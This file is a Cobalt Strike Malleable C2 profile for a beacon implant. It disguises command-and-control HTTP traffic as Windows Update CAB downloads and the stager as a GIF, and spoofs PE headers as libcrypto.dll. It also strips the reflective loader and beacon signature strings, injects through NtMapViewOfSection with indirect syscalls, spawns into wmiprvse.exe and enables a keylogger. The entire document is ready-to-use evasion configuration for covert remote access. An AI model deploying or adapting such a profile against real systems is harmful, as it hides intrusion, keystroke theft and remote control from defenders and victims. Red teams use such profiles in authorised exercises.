set sleeptime "44000";
set jitter    "37";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.133 Safari/537.36";

# Task and Proxy Max Size
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

set data_jitter "50";
set smb_frame_header "";
set pipename "W32TIME_ALT_3490";
set pipename_stager "W32TIME_ALT_2429";

set tcp_frame_header "";
set ssh_banner "Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)";
set ssh_pipename "W32TIME_ALT_##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}



stage {
        set obfuscate "true";
        set stomppe "true";
        set cleanup "true";
        set userwx "false";
        set smartinject "true";
        set syscall_method "Indirect";


        #TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
        #They will also obfuscate themselves while they wait to read information from their parent Beacon.
        set sleep_mask "true";


        set checksum       "0";
        set compile_time   "10 Aug 2018 19:22:06";
        set entry_point    "869360";
        set image_size_x86 "1638400";
        set image_size_x64 "1638400";
        set name           "libcrypto.dll";
        set rich_header  "\xbe\xf7\xf9\xa0\xfa\x96\x97\xf3\xfa\x96\x97\xf3\xfa\x96\x97\xf3\x89\xf4\x93\xf2\xf0\x96\x97\xf3\x89\xf4\x94\xf2\xfc\x96\x97\xf3\x89\xf4\x92\xf2\x52\x96\x97\xf3\x64\x36\x50\xf3\xf2\x96\x97\xf3\x28\xf2\x94\xf2\xf3\x96\x97\xf3\x28\xf2\x92\xf2\xef\x96\x97\xf3\x28\xf2\x93\xf2\xeb\x96\x97\xf3\xf3\xee\x04\xf3\xc9\x96\x97\xf3\xfa\x96\x96\xf3\x7d\x96\x97\xf3\x11\xf2\x93\xf2\xd4\x94\x97\xf3\x11\xf2\x97\xf2\xfb\x96\x97\xf3\x11\xf2\x68\xf3\xfb\x96\x97\xf3\xfa\x96\x00\xf3\xfb\x96\x97\xf3\x11\xf2\x95\xf2\xfb\x96\x97\xf3\x52\x69\x63\x68\xfa\x96\x97\xf3\x00\x00\x00\x00\x00\x00\x00\x00";
        set magic_mz_x86 "NnOD";
        set magic_mz_x64 "MNOD";
        set magic_pe "EA";


        transform-x86 {
                prepend "\xFF\xC0\xFF\xC8"; # new instruction set with inverse pairings
                strrep "\x4D\x5A\x41\x52\x55\x48\x89\xE5\x48\x81\xEC\x20\x00\x00\x00\x48\x8D\x1D\xEA\xFF\xFF\xFF\x48\x89\xDF\x48\x81\xC3\xA4\x6E\x01\x00\xFF\xD3\x41\xB8\xF0\xB5\xA2\x56\x68\x04\x00\x00\x00\x5A\x48\x89\xF9\xFF\xD0" "\x4D\x5A\x48\x8D\x1D\xF8\xFF\xFF\xFF\x41\x52\x48\x83\xEC\x28\x48\x89\xDF\x48\x81\xC3\x52\xB7\x00\x00\x48\x81\xC3\x52\xB7\x00\x00\xFF\xD3\x48\xC7\xC2\x04\x00\x00\x00\x48\x89\xF9\xFF\xD0"; #Modified Reflective Loader Stub
                strrep "ReflectiveLoader" "LoadDataImage";
                strrep "This program cannot be run in DOS mode" "Please Refer To Manual";
                strrep "(admin)""(adm)";
                strrep "is an x64 process (can't inject x86 content)" "cant go from 86 to 64";
                strrep "is an x86 process (can't inject x64 content)" "cant go from 64 to 86"; 
                strrep "I'm already in SMB mode" "smbmodeengaged";
                strrep "msvcrt.dll" "";
                strrep "C:\\Windows\\System32\\msvcrt.dll" "";
                strrep "This program cannot be run in DOS mode" "";
                strrep "Stack around the variable" "";
                strrep "was corrupted." "";
                strrep "The variable" "";
                strrep "is being used without being initialized." "";
                strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
                strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
                strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
                strrep "Stack memory was corrupted" "";
                strrep "A local variable was used before it was initialized" "";
                strrep "Stack memory around _alloca was corrupted" "";
                strrep "Unknown Runtime Check Error" "";
                strrep "Unknown Filename" "";
                strrep "Unknown Module Name" "";
                strrep "Run-Time Check Failure" "";
                strrep "Stack corrupted near unknown variable" "";
                strrep "Stack pointer corruption" "";
                strrep "Cast to smaller type causing loss of data" "";
                strrep "Stack memory corruption" "";
                strrep "Local variable used before initialization" "";
                strrep "Stack around" "corrupted";
                strrep "operator" "";
                strrep "operator co_await" "";
                strrep "operator<=>" "";

                }



        transform-x64 {
                prepend "\xFF\xC0\xFF\xC8"; # new instruction set with inverse pairings
               
                strrep "(admin)""(adm)";
                strrep "is an x64 process (can't inject x86 content)" "cant go from 86 to 64";
                strrep "is an x86 process (can't inject x64 content)" "cant go from 64 to 86";
                strrep "I'm already in SMB mode" "smbmodeengaged";
                strrep "ReflectiveLoader" "LoadData";
                strrep "This program cannot be run in DOS mode" "please see manual";
                strrep "beacon.x64.dll" "treme.x64.dll";
                strrep "beacon.dll" "beaker.dll";
                strrep "Stack around the variable" "";
                strrep "was corrupted." "";
                strrep "The variable" "";
                strrep "is being used without being initialized." "";
                strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
                strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
                strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
                strrep "Stack memory was corrupted" "";
                strrep "A local variable was used before it was initialized" "";
                strrep "Stack memory around _alloca was corrupted" "";
                strrep "Unknown Runtime Check Error" "";
                strrep "Unknown Filename" "";
                strrep "Unknown Module Name" "";
                strrep "Run-Time Check Failure" "";
                strrep "Stack corrupted near unknown variable" "";
                strrep "Stack pointer corruption" "";
                strrep "Cast to smaller type causing loss of data" "";
                strrep "Stack memory corruption" "";
                strrep "Local variable used before initialization" "";
                strrep "Stack around" "corrupted";
                strrep "operator" "";
                strrep "operator co_await" "";
                strrep "operator<=>" "";
                }
}


process-inject {
    # set remote memory allocation technique
      
    set allocator "NtMapViewOfSection";
    set bof_reuse_memory "true";
    # shape the content and properties of what we will inject
    set min_alloc "38634";
    set userwx    "false";
    set startrwx "false";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

   

}

post-ex {
    # control the temporary process we spawn to

    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
    set pipename "W32TIME_ALT_####"; 
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "false";

        # control the method used to log keystrokes 
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}


http-config {

        #set "true" if teamserver is behind redirector
        set trust_x_forwarded_for "false";
}

http-get {
set uri "/c/msdownload/update/others/2022/11/lvJH6WKebIxYOP5aqCjtB ";



client {

        header "Accept" "*/*";
        header "Host" "10.9.253.6";

        metadata {
                base64url;
                append ".bin";
                uri-append;
        }
}


server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        output {

                print;
        }
}
}

http-post {
set uri "/c/msdownload/update/others/2023/1/XPsPk-qQVhdGPkRajly9Z ";


set verb "GET";

client {

        header "Accept" "*/*";


        id {
                prepend "download.windowsupdate.com/c/";
                header "Host";
        }


        output {
                base64url;
                append ".bin";
                uri-append;
        }
}

server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        output {
                print;
        }
}
}

http-stager {
    set uri_x86 "/_init.gif";
    set uri_x64 "/__init.gif";

    server {
        header "Content-Type" "image/gif";

        output {
            prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
            prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
            print;
        }
    }
}
